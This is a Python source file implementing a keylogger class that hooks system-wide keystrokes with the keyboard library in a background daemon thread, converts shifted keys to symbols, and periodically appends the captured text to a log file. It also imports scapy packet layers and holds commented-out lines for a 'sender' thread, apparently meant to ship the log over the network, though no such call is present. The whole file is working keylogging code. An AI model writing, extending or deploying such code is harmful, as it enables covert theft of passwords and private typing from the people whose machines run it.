from threading import Timer

import keyboard
from scapy.all import *
from scapy.layers.inet import IP, UDP


class keylog:
    def __init__(self, time, file):
        self.file = file

        open(file, "w+")
        self.time = time
        self.log = ""

        self.on = False

    def start(self):
        if not self.on:
            self.on = True
            self.__report()
            thread = Thread(target=self.__loop)
            thread.daemon = True
            thread.start()
            return True
        else:
            return False

    def stop(self):
        if self.on:
            self.on = False
            return True
        return False

    def __loop(self):
        key = keyboard.read_key()
        if self.on:
            self.__input(key)
            self.__loop()

    def __input(self, name):
        if not self.on:
            return
        if keyboard.is_pressed(name):
            return
        if len(name) > 1:
            match name:
                case "enter":
                    name = "\n"
                case "space":
                    name = " "
                case _:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"

        elif keyboard.is_pressed("shift"):
            name = self.__capitalize(name)
        self.log += name
        # self.report()

    def __report(self):
        if self.log:
            file = open(self.file, "a+")
            print(self.log, file=file)
            # print(f"{self.log}")
        # x = threading.Thread(target=self.sender)
        # x.daemon = True
        # x.start()
        if self.on:
            self.log = ""
            t = Timer(interval=self.time, function=self.__report)
            t.daemon = True
            t.start()

    @staticmethod
    def __capitalize(name):
        match name:
            case "1":
                return "!"
            case "2":
                return "@"
            case "3":
                return "#"
            case "4":
                return "$"
            case "5":
                return "%"
            case "6":
                return "^"
            case "7":
                return "&"
            case "8":
                return "*"
            case "9":
                return "("
            case "0":
                return ")"
            case "-":
                return "_"
            case "=":
                return "+"
            case "[":
                return "{"
            case "]":
                return "}"
            case r'\'':
                return "|"
            case ";":
                return ":"
            case "'":
                return r'"'
            case ",":
                return "<"
            case ".":
                return ">"
            case "/":
                return "?"
            case "`":
                return "~"
            case _:
                return name.upper()

